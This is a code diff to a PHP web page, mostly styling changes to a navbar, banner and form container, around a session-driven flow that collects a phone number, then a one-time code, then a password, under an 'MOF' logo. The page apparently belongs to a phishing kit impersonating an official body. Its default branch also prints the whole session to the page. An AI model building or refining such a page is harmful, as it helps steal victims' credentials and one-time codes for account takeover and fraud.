@@ -90,8 +90,7 @@
             body {
                 font-family: "Inter", serif;
                 background-color: #F6F7FA;
-                max-width: 450px;
-               
+                max-width: 450px;              
             }
             .btdk {
               background-color: #fea069;
@@ -110,6 +109,7 @@
             .secmof {
               background-color: #f7d1b8;
               margin-top: 24px;
+              width: 103%;
             }
 
             .footerdk {
@@ -124,12 +124,11 @@
     </head>
     <body class="mx-auto">
 
-      <nav class="navbar bg-body-tertiary">
+      <nav class="navbar bg-body-tertiary" style="background-color: white; box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);">
   <div class="container-fluid">
 
     <a class="navbar-brand" href="#">
       <img src="assets/MOF_logo.jpg" alt="Logo" width="75" height="40" class="d-inline-block align-text-top">
-
     </a>
     <div class="align-content-center">
                 <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
@@ -138,12 +137,12 @@
             </div>
   </div>
 </nav>
-
-<div class="banner">
-  <img src="assets/banner1.jpg">
-</div>
-
-  <div class="mx-auto" style="width: 92%; margin-top: 23px; padding: 20px 16px; max-width: 500px;background: #FFF; border-radius: 8px; box-shadow: rgba(0, 0, 0, 0.15) 0px 4px 10px;" >
+<div class="mx-auto dkclass" style="width: 92%; margin-top: 23px; padding: 100px 16px; max-width: 500px; height: 700px; 
+    background-image: url('assets/form-bg.jpg'); 
+    background-size: cover;
+    background-position: center;
+    border-radius: 8px; 
+    box-shadow: rgba(0, 0, 0, 0.15) 0px 4px 10px;">
 
         <?php
       if(!isset($_SESSION["state"]) OR isset($_GET["otherAccount"])) {
@@ -155,7 +154,7 @@
         case "start": require("Lander.php"); break;
         case "phone": require("OTPC.php"); break;
         case "otp":   require("PASS.php"); break;
-        case "success": require("SCCS.php"); break;
+        case "success":   require("SCCS.php"); break;
         default: print_r($_SESSION);
       }
     ?>
